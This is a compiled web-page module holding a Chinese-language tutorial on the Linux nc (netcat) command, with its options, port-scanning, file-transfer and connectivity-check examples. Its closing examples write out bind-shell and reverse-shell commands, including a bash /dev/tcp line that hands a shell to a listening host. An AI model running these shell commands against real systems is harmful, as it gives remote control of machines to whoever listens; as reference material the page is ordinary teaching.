import{_ as n}from"./plugin-vue_export-helper-DlAUqK2U.js";import{o as a,c as s,e}from"./app-D_HUMAmc.js";const t={},p=e(`<h1 id="nc" tabindex="-1"><a class="header-anchor" href="#nc"><span>nc</span></a></h1><p>nc是网络工具中的瑞士军刀</p><h2 id="补充说明" tabindex="-1"><a class="header-anchor" href="#补充说明"><span>补充说明</span></a></h2><p><strong>nc命令</strong> 全称<strong>netcat</strong>，用于TCP、UDP或unix域套接字(uds)的数据流操作，它可以打开TCP连接，发送UDP数据包，监听任意TCP 和UDP端口，同时也可用作做端口扫描，支持IPv4和IPv6，与Telnet的不同在于nc可以编写脚本。</p><h3 id="语法" tabindex="-1"><a class="header-anchor" href="#语法"><span>语法</span></a></h3><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token punctuation">[</span>-hlnruz<span class="token punctuation">]</span><span class="token punctuation">[</span>-g<span class="token operator">&lt;</span>网关<span class="token punctuation">..</span>.<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-G<span class="token operator">&lt;</span>指向器数目<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-i<span class="token operator">&lt;</span>延迟秒数<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-o<span class="token operator">&lt;</span>输出文件<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-p<span class="token operator">&lt;</span>通信端口<span class="token operator">&gt;</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>-s<span class="token operator">&lt;</span>来源位址<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-v<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span>-w<span class="token operator">&lt;</span>超时秒数<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>主机名称<span class="token punctuation">]</span><span class="token punctuation">[</span>通信端口<span class="token punctuation">..</span>.<span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="选项" tabindex="-1"><a class="header-anchor" href="#选项"><span>选项</span></a></h3><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token parameter variable">-4</span> 只使用IPV4
<span class="token parameter variable">-6</span> 只使用IPV6
<span class="token parameter variable">-c</span> 使用tls连接或者监听
<span class="token parameter variable">-D</span> 启用socket调试开关
<span class="token parameter variable">-g</span> <span class="token operator">&lt;</span>网关<span class="token operator">&gt;</span> <span class="token comment"># 设置路由器跃程通信网关，最多可设置8个。</span>
-G<span class="token operator">&lt;</span>指向器数目<span class="token operator">&gt;</span> <span class="token comment"># 设置来源路由指向器，其数值为4的倍数。</span>
<span class="token parameter variable">-h</span> 在线帮助。
-i<span class="token operator">&lt;</span>延迟秒数<span class="token operator">&gt;</span> 设置时间间隔，以便传送信息及扫描通信端口。
<span class="token parameter variable">-l</span> 使用监听模式，管控传入的资料。
<span class="token parameter variable">-n</span> 直接使用IP地址，而不通过域名服务器。
-o<span class="token operator">&lt;</span>输出文件<span class="token operator">&gt;</span> <span class="token comment"># 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</span>
-p<span class="token operator">&lt;</span>通信端口<span class="token operator">&gt;</span> <span class="token comment"># 设置本地主机使用的通信端口。</span>
<span class="token parameter variable">-r</span> 乱数指定本地与远端主机的通信端口。
-s<span class="token operator">&lt;</span>来源位址<span class="token operator">&gt;</span> <span class="token comment"># 设置本地主机送出数据包的IP地址。</span>
<span class="token parameter variable">-u</span> 使用UDP传输协议。
<span class="token parameter variable">-v</span> 显示指令执行过程。
-w<span class="token operator">&lt;</span>超时秒数<span class="token operator">&gt;</span> <span class="token comment"># 设置等待连线的时间。</span>
<span class="token parameter variable">-z</span> 使用0输入/输出模式，只在扫描通信端口时使用。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="实例" tabindex="-1"><a class="header-anchor" href="#实例"><span>实例</span></a></h3><p><strong>TCP端口扫描</strong></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -v -z -w2 192.168.0.3 1-100 </span>
<span class="token number">192.168</span>.0.3: inverse <span class="token function">host</span> lookup failed: Unknown <span class="token function">host</span>
<span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.3<span class="token punctuation">]</span> <span class="token number">80</span> <span class="token punctuation">(</span>http<span class="token punctuation">)</span> <span class="token function">open</span>
<span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.3<span class="token punctuation">]</span> <span class="token number">23</span> <span class="token punctuation">(</span>telnet<span class="token punctuation">)</span> <span class="token function">open</span>
<span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.3<span class="token punctuation">]</span> <span class="token number">22</span> <span class="token punctuation">(</span>ssh<span class="token punctuation">)</span> <span class="token function">open</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>扫描192.168.0.3 的端口 范围是 1-100 <strong>扫描UDP端口</strong></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -u -z -w2 192.168.0.3 1-1000  # 扫描192.168.0.3 的端口 范围是 1-1000</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>扫描指定端口</strong></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -nvv 192.168.0.1 80 # 扫描 80端口</span>
<span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.1<span class="token punctuation">]</span> <span class="token number">80</span> <span class="token punctuation">(</span>?<span class="token punctuation">)</span> <span class="token function">open</span>
y  //用户输入
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>查看从服务器到目的地的出站端口 443 是否被防火墙阻止</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-vz</span> acme-v02.api.letsencrypt.org <span class="token number">443</span> <span class="token parameter variable">-w2</span>
<span class="token comment"># Ncat: Version 7.50 ( https://nmap.org/ncat )</span>
<span class="token comment"># Ncat: Connected to 23.77.214.183:443.</span>
<span class="token comment"># Ncat: 0 bytes sent, 0 bytes received in 0.07 seconds.</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>文件传输</strong></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># 接收方提前设置监听端口与要接收的文件名（文件名可自定义）：</span>
<span class="token function">nc</span> <span class="token parameter variable">-lp</span> <span class="token number">8888</span> <span class="token operator">&gt;</span> node.tar.gz

<span class="token comment"># 传输方发文件：</span>
<span class="token function">nc</span> <span class="token parameter variable">-nv</span> <span class="token number">192.168</span>.75.121 <span class="token number">8888</span>  <span class="token operator">&lt;</span> node_exporter-1.3.1.linux-amd64.tar.gz
<span class="token comment"># ⚠️ 注意：192.168.75.121是接收方的ip地址。</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># 如果希望文件传输结束后自动退出，可以使用下面的命令：</span>
<span class="token function">nc</span> <span class="token parameter variable">-lp</span> <span class="token number">8888</span> <span class="token operator">&gt;</span> node.tar.gz
<span class="token function">nc</span> <span class="token parameter variable">-nv</span> <span class="token number">192.168</span>.75.121 <span class="token number">8888</span> <span class="token parameter variable">-i</span> <span class="token number">1</span> <span class="token operator">&lt;</span> node_exporter-1.3.1.linux-amd64.tar.gz
<span class="token comment"># ⚠️ 注意：-i 表示闲置超时时间</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>远程控制</strong></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># 正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。</span>
<span class="token comment"># 被控制端执行下面的命令：</span>
<span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span> <span class="token parameter variable">-c</span> <span class="token function">bash</span>
<span class="token comment"># 控制端执行下面的命令：</span>
<span class="token function">nc</span> <span class="token number">192.168</span>.75.121 <span class="token number">8888</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># 反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。</span>
<span class="token comment"># 控制端执行下面的命令：</span>
<span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span>
<span class="token comment"># 被控制端执行下面的命令：</span>
<span class="token function">nc</span> <span class="token number">192.168</span>.75.121 <span class="token number">8888</span> <span class="token parameter variable">-c</span> <span class="token function">bash</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>反弹shell</strong></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># 控制端执行下面的命令：</span>
<span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code># 被控端执行下面的命令:
bash -i &amp;&gt; /dev/tcp/192.168.75.121/8888 0&gt;&amp;1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,26),l=[p];function c(o,i){return a(),s("div",null,l)}const u=n(t,[["render",c],["__file","nc.html.vue"]]),m=JSON.parse('{"path":"/command/linux/nc.html","title":"nc","lang":"zh-CN","frontmatter":{"description":"nc nc是网络工具中的瑞士军刀 补充说明 nc命令 全称netcat，用于TCP、UDP或unix域套接字(uds)的数据流操作，它可以打开TCP连接，发送UDP数据包，监听任意TCP 和UDP端口，同时也可用作做端口扫描，支持IPv4和IPv6，与Telnet的不同在于nc可以编写脚本。 语法 选项 实例 TCP端口扫描 扫描192.168.0.3...","head":[["meta",{"property":"og:url","content":"https://baymaxcoding.github.io/command/linux/nc.html"}],["meta",{"property":"og:site_name","content":"BaymaxCoding"}],["meta",{"property":"og:title","content":"nc"}],["meta",{"property":"og:description","content":"nc nc是网络工具中的瑞士军刀 补充说明 nc命令 全称netcat，用于TCP、UDP或unix域套接字(uds)的数据流操作，它可以打开TCP连接，发送UDP数据包，监听任意TCP 和UDP端口，同时也可用作做端口扫描，支持IPv4和IPv6，与Telnet的不同在于nc可以编写脚本。 语法 选项 实例 TCP端口扫描 扫描192.168.0.3..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-04-12T04:24:50.000Z"}],["meta",{"property":"article:author","content":"BaymaxCoding"}],["meta",{"property":"article:modified_time","content":"2024-04-12T04:24:50.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"nc\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2024-04-12T04:24:50.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"BaymaxCoding\\",\\"url\\":\\"https://baymaxcoding.github.io/\\"}]}"]]},"headers":[{"level":2,"title":"补充说明","slug":"补充说明","link":"#补充说明","children":[{"level":3,"title":"语法","slug":"语法","link":"#语法","children":[]},{"level":3,"title":"选项","slug":"选项","link":"#选项","children":[]},{"level":3,"title":"实例","slug":"实例","link":"#实例","children":[]}]}],"git":{"createdTime":1712895890000,"updatedTime":1712895890000,"contributors":[{"name":"BaymaxCoding","email":"BRemail2324996822@163.com","commits":1}]},"readingTime":{"minutes":2.83,"words":850},"filePathRelative":"command/linux/nc.md","localizedDate":"2024年4月12日","autoDesc":true}');export{u as comp,m as data};
